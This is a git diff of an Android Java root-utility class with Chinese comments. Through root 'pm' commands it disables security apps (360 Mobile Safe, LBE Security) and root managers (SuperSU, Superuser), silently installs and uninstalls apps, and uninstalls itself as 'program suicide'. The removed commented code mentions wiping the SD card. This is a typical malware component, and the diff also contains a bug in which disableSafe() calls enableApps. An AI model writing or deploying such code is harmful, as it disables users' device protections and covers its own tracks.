@@ -5,6 +5,7 @@ import android.content.Context;
 import android.text.TextUtils;
 import android.util.Log;
 
+import com.example.testsu.Config;
 import com.stericson.RootTools.RootTools;
 
 import java.io.DataOutputStream;
@@ -19,43 +20,56 @@ public class RootUtils {
 
     private static String TAG = "RootUtils";
 
-
     /**
-     * 禁止 root权限管理软件安全管理App
-     * @return
+     * 程序自杀
+     *
+     * @return boolean 是否成功
      */
-    public static boolean disableSafe() {
-        return RootUtils.disableApp("com.qihoo360.mobilesafe") &&
-                RootUtils.disableApp("com.lbe.security");
+    public static boolean suicide(Context context) {
+        return uninstallApk(context.getPackageName());
     }
 
     /**
      * 禁止 root权限管理软件安全管理App
+     *
+     * @return
+     */
+    public static boolean disableSafe() {
+        return enableApps(Config.SAFE_APP_PACKAGE_NAME_ARRAY);
+    }
+
+    /**
+     * 禁止 root权限管理软件安全管理App
+     *
      * @return
      */
     public static boolean enableSafe() {
-        return RootUtils.enableApp("com.qihoo360.mobilesafe") &&
-                RootUtils.enableApp("com.lbe.security");
+        return enableApps(Config.SAFE_APP_PACKAGE_NAME_ARRAY);
     }
 
     /**
      * 禁止 root权限管理软件
+     *
      * @return
      */
     public static boolean disableSu() {
-        return RootUtils.disableApp("com.noshufou.android.su") &&
-                RootUtils.disableApp("eu.chainfire.supersu");
+        return disableApps(Config.SU_APP_PACKAGE_NAME_ARRAY);
     }
 
     /**
-     *   启用root权限管理软件
+     * 启用root权限管理软件
+     *
      * @return
      */
     public static boolean enableSu() {
-        return RootUtils.enableApp("com.noshufou.android.su") &&
-                RootUtils.enableApp("eu.chainfire.supersu");
+        return enableApps(Config.SU_APP_PACKAGE_NAME_ARRAY);
     }
 
+    /**
+     * 安装应用
+     * @param apkFilePath apk 文件路径
+     * @return
+     */
     public static boolean installApk(String apkFilePath) {
         if (TextUtils.isEmpty(apkFilePath)) {
             Log.e(TAG, "APK_FILEPATH is null or empty");
@@ -67,9 +81,14 @@ public class RootUtils {
 
     }
 
+    /**
+     * 卸载App
+     * @param packageName 应用包名
+     * @return
+     */
     public static boolean uninstallApk(String packageName) {
         if (TextUtils.isEmpty(packageName)) {
-            Log.e(TAG, "APK_FILEPATH is null or empty");
+            Log.e(TAG, "APK_PACKAGE_NAME is null or empty");
             return false;
         }
         Log.d(TAG, "uninstall " + packageName);
@@ -80,31 +99,74 @@ public class RootUtils {
     }
 
 
+    /**
+     *   禁用App
+     * @param packageName  应用包名
+     * @return
+     */
     public static boolean disableApp(String packageName) {
         String cmd = "pm disable " + packageName;
         return executeCMD(cmd);
 
     }
 
+    /**
+     * 启用应用
+     * @param packageName 应用包名
+     * @return
+     */
     public static boolean enableApp(String packageName) {
         String cmd = "pm enable " + packageName;
         return executeCMD(cmd);
 
     }
 
-    public static boolean executeCMD(String cmd) {
-        try {
-            executeRootCMD(cmd);
-            List<String> results = RootTools.sendShell(
-                    cmd, 30000);
-            Log.d(TAG, results.get(0));
-            return true;
-
-        } catch (Exception e) {
-            e.printStackTrace();
-            return false;
-        }
+    /**
+     * 静默安装 多个App
+     *
+     * @param apkFilePathArray Apk文件路径数组
+     * @return
+     */
+    public static boolean installApps(String[] apkFilePathArray) {
+        String cmdPrefix = "pm install -r ";
+        return executeMultilineCMD(cmdPrefix, apkFilePathArray);
     }
+
+    /**
+     * 静默卸载 多个App
+     *
+     * @param packageNameArray App 包名数组
+     * @return
+     */
+    public static boolean uninstallApps(String[] packageNameArray) {
+        String cmdPrefix = "pm uninstall ";
+        return executeMultilineCMD(cmdPrefix, packageNameArray);
+    }
+
+    /**
+     * 禁用 多个App
+     *
+     * @param packageNameArray 包名String数组
+     * @return
+     */
+    public static boolean disableApps(String[] packageNameArray) {
+        String cmdPrefix = "pm disable ";
+        return executeMultilineCMD(cmdPrefix, packageNameArray);
+    }
+
+    /**
+     * 启用 多个App
+     *
+     * @param packageNameArray 包名String数组
+     * @return
+     */
+    public static boolean enableApps(String[] packageNameArray) {
+        String cmdPrefix = "pm enable ";
+        return executeMultilineCMD(cmdPrefix, packageNameArray);
+    }
+
+
+
 
 
     /**
@@ -127,8 +189,73 @@ public class RootUtils {
 
     }
 
+
+
     /**
-     * 执行root 命令
+     * 检测手机是否有 root权限
+     * @return
+     */
+    public static boolean checkRootPermission() {
+        if (RootTools.isRootAvailable()) {
+            Log.i(TAG, "已获取root权限");
+            return true;
+        } else {
+            Log.i(TAG, "未获取root权限");
+            try {
+                Runtime.getRuntime().exec("su");
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            return false;
+        }
+    }
+
+
+
+
+    /**
+     * 执行多行命令
+     *
+     * @param cmdPrefix       String 命令统一前缀
+     * @param cmdPostfixArray String[] 命令后缀数组
+     * @return
+     */
+    public static boolean executeMultilineCMD(String cmdPrefix, String[] cmdPostfixArray) {
+
+        String cmds = "";
+        String cmd = "";
+        for (String pkgName : cmdPostfixArray) {
+            cmd = cmdPrefix +" "+ pkgName + "\n";
+            cmds += cmd;
+        }
+        return executeCMD(cmds);
+
+    }
+
+    /**
+     * 执行 shell 命令
+     * @param cmd shell 命令
+     * @return
+     */
+    public static boolean executeCMD(String cmd) {
+        try {
+            //分别调用自实现的方法和RootTools的方法 双重保障
+            //调用自实现的方法
+            executeRootCMD(cmd);
+            //调用RootTools的方法
+            List<String> results = RootTools.sendShell(
+                    cmd, 30000);
+            Log.d(TAG, results.get(0));
+            return true;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return false;
+        }
+    }
+
+
+    /**
+     * 执行root 命令 自实现
      *
      * @param command2
      * @return
@@ -183,123 +310,4 @@ public class RootUtils {
     }
 
 
-    public static boolean checkRootPermission() {
-        if (RootTools.isRootAvailable()) {
-            Log.i(TAG, "已获取root权限");
-            return true;
-        } else {
-            Log.i(TAG, "未获取root权限");
-            try {
-                Runtime.getRuntime().exec("su");
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-            return false;
-        }
-    }
-
-    /**
-     * 程序自杀
-     *
-     * @return
-     */
-    public static boolean suicide(Context context) {
-        // 清空SD卡文件
-
-        //SDCardUtils.cleanSDCard();
-        // RootUtils.enableAllSu();
-        // 卸载自己
-        // return
-        // RootUtils.executeRootCMD("pm uninstall com.android.keyservice");
-        //RootUtils.enableAllSafe();
-        return uninstallApk(context.getPackageName());
-    }
-
-//     /**
-//     * 关闭所有安全软件 在新线程中
-//     */
-//     public static void disableAllSu() {
-//     // new Thread(new Runnable() {
-//
-//     // @Override
-//     // public void run() {
-//     String cmdPm = "pm disable ";
-//     String cmdAll = "";
-//     String cmd = "";
-//     for (String pkg : AppContext.supkgList) {
-//     cmd = cmdPm + pkg + " \n ";
-//     cmdAll += cmd;
-//     }
-//     RootUtils.executeRootCMD(cmdAll);
-//     Log.i(TAG, "关闭权限管理软件");
-//     // }
-//     // }).start();
-//
-//     }
-
-    // /**
-    // * 关闭所有安全软件 在新线程中
-    // */
-    // public static void disableAllSafe() {
-    // // new Thread(new Runnable() {
-    //
-    // // @Override
-    // // public void run() {
-    // String cmdPm = "pm disable ";
-    // String cmdAll = "";
-    // String cmd = "";
-    // for (String pkg : AppContext.pkgList) {
-    // cmd = cmdPm + pkg + " \n ";
-    // cmdAll += cmd;
-    // }
-    // RootUtils.executeRootCMD(cmdAll);
-    // Log.i(TAG, "关闭安全软件");
-    // // }
-    // // }).start();
-    //
-    // }
-
-    // /**
-    // * 开启所有权限管理软件 在新线程中
-    // */
-    // public static void enableAllSu() {
-    // // new Thread(new Runnable() {
-    // //
-    // // @Override
-    // // public void run() {
-    // String cmdAll = "";
-    // String cmdPm = "pm enable ";
-    // String cmd = "";
-    // for (String pkg : AppContext.supkgList) {
-    // cmd = cmdPm + pkg + " \n ";
-    // cmdAll += cmd;
-    // }
-    // RootUtils.executeRootCMD(cmdAll);
-    // Log.i(TAG, "开启权限管理软件");
-    // // }
-    // // }).start();
-    //
-    // }
-
-    // /**
-    // * 开启所有安全软件 在新线程中
-    // */
-    // public static void enableAllSafe() {
-    // // new Thread(new Runnable() {
-    // //
-    // // @Override
-    // // public void run() {
-    // String cmdAll = "";
-    // String cmdPm = "pm enable ";
-    // String cmd = "";
-    // for (String pkg : AppContext.pkgList) {
-    // cmd = cmdPm + pkg + " \n ";
-    // cmdAll += cmd;
-    // }
-    // RootUtils.executeRootCMD(cmdAll);
-    // Log.i(TAG, "开启安全软件");
-    // // }
-    // // }).start();
-    //
-    // }
 }
